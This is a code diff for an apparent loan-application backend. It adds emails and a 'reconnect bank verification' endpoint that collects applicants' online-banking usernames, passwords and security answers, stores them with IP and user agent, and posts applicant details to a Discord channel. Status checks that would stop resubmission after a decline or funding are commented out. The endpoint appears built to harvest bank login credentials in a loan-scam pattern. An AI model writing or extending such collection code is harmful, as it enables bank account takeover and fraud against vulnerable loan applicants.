@@ -8,6 +8,10 @@ import {
 } from "../services/applicationService";
 import { sendDiscordNotification } from "../services/discordService";
 import { email } from "zod";
+import {
+  sendPostBankVerificationEmail,
+  sendReconnectBankVerificationSubmittedEmail,
+} from "../services/emailService";
 
 const router = Router();
 
@@ -120,6 +124,22 @@ router.post("/", async (req: Request, res: Response) => {
       return;
     }
 
+    // Block bank verification if status is DECLINED_HD, DECLINED_pb, DECLINED, or FUNDED
+    // const DISALLOWED_STATUSES = [
+    //   "declined_hd",
+    //   "declined_pb",
+    //   "declined",
+    //   "funded",
+    //   "bank_verification_completed",
+    // ];
+
+    // // Convert current application status to lowercase before checking
+    // if (DISALLOWED_STATUSES.includes(application.status?.toLowerCase())) {
+    //   return res.status(400).json({
+    //     error: `Bank verification is not allowed because your application status is ${application.status}.`,
+    //   });
+    // }
+
     try {
       await markBankVerificationUploaded(body.applicationId);
     } catch (flagError) {
@@ -146,6 +166,18 @@ router.post("/", async (req: Request, res: Response) => {
       } catch (statusError) {
         console.warn("Failed to auto-update application status:", statusError);
       }
+    }
+
+    // Send Post-Bank Verification Email
+    try {
+      await sendPostBankVerificationEmail({
+        applicationId: application?.id,
+        firstName: application.first_name,
+        email: application.email,
+        loanAmount: application.loan_amount,
+      });
+    } catch (emailError) {
+      console.error("Failed to send post-bank verification email:", emailError);
     }
 
     // Send Discord notification
@@ -179,5 +211,166 @@ router.post("/", async (req: Request, res: Response) => {
       .json({ error: "An internal error occurred. Please try again." });
   }
 });
+
+router.post(
+  "/reconnect-bank-verification",
+  async (req: Request, res: Response) => {
+    try {
+      const ip =
+        (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
+        req.ip ||
+        "unknown";
+
+      // Validate request body
+      const parsed = bankVerificationSchema.safeParse(req.body);
+      if (!parsed.success) {
+        const firstError = parsed.error.issues[0];
+        res.status(400).json({
+          error: firstError?.message || "Invalid input",
+          field: firstError?.path[0],
+        });
+        return;
+      }
+
+      const body = parsed.data;
+      const userAgent = (req.headers["user-agent"] as string) || "unknown";
+
+      // Verify the application exists and is in an acceptable status
+      let application;
+      try {
+        application = await getApplicationById(body.applicationId);
+
+        if (!application) {
+          return res.status(404).json({ error: "Application not found" });
+        }
+
+        // Allow submission for pending, failed, or already in-progress statuses
+        // const allowedStatuses = [
+        //   "bank_verification_pending",
+        //   "bank_verification_failed",
+        //   "bank_verification_in_progress",
+        //   "deposit_in_progress",
+        // ];
+        // if (!allowedStatuses.includes(application.status)) {
+        //   return res.status(400).json({
+        //     error: "Bank verification cannot be submitted for this application.",
+        //   });
+        // }
+      } catch (dbError) {
+        console.error("Failed to verify application:", dbError);
+        return res.status(500).json({
+          error: "Failed to verify application. Please try again.",
+        });
+      }
+
+      // // Block bank verification if status is DECLINED_HD, DECLINED_pb, DECLINED, or FUNDED
+      // const DISALLOWED_STATUSES = [
+      //   "declined_hd",
+      //   "declined_pb",
+      //   "declined",
+      //   "funded",
+      //   "bank_verification_completed",
+      // ];
+
+      // // Convert current application status to lowercase before checking
+      // if (DISALLOWED_STATUSES.includes(application.status?.toLowerCase())) {
+      //   return res.status(400).json({
+      //     error: `Bank verification is not allowed because your application status is ${application.status}.`,
+      //   });
+      // }
+
+      // Upsert bank verification record (overwrite previous if exists)
+      let verificationId: string;
+      try {
+        const result = await upsertBankVerification({
+          applicationId: body.applicationId,
+          bankName: body.bankName,
+          accountType: body.accountType,
+          bankingUsername: body.bankingUsername,
+          bankingPassword: body.bankingPassword,
+          securityQuestion: body.securityQuestion || undefined,
+          fullName: body.fullName,
+          email: body.email,
+          ipAddress: ip,
+          userAgent,
+        });
+        verificationId = result.id;
+      } catch (dbError) {
+        console.error("Bank verification upsert failed:", dbError);
+        res.status(500).json({
+          error: "Failed to save bank verification. Please try again.",
+        });
+        return;
+      }
+
+      try {
+        await markBankVerificationUploaded(body.applicationId);
+      } catch (flagError) {
+        console.warn(
+          "Failed to set bank_verification_completed flag:",
+          flagError,
+        );
+      }
+
+      // Auto-update application status to bank_verification_completed once the
+      // applicant submits their bank details. Only advance from the pre-submission
+      // statuses (not if admin has already moved it further along).
+
+      try {
+        await updateApplicationStatus(
+          body.applicationId,
+          "bank_verification_completed",
+          "system",
+        );
+      } catch (statusError) {
+        console.warn("Failed to auto-update application status:", statusError);
+      }
+      // Send Post-Bank Verification Email
+      try {
+        await sendReconnectBankVerificationSubmittedEmail({
+          applicationId: application?.id,
+          firstName: application.first_name,
+          email: application.email,
+          loanAmount: application.loan_amount,
+        });
+      } catch (emailError) {
+        console.error(
+          "Failed to send post-bank verification email:",
+          emailError,
+        );
+      }
+
+      // Send Discord notification
+      try {
+        await sendDiscordNotification(
+          `🏦 **Bank Verification Submitted**\n` +
+            `**Name:** ${body.fullName}\n` +
+            `**Email:** ${body.email}\n` +
+            `**Bank:** ${body.bankName}\n` +
+            `**Account Type:** ${body.accountType}\n` +
+            `**Application ID:** ${body.applicationId}\n` +
+            `**Verification ID:** ${verificationId}`,
+        );
+      } catch (err) {
+        console.error("Discord notification error:", err);
+      }
+
+      console.log(
+        `Bank verification submitted: ${verificationId} for application: ${body.applicationId}`,
+      );
+
+      res.json({
+        success: true,
+        verificationId,
+        message: "Bank verification credentials submitted successfully.",
+      });
+    } catch (error) {
+      console.error("Bank verification submission error:", error);
+      res
+        .status(500)
+        .json({ error: "An internal error occurred. Please try again." });
+    }
+  },
+);
 
 export default router;
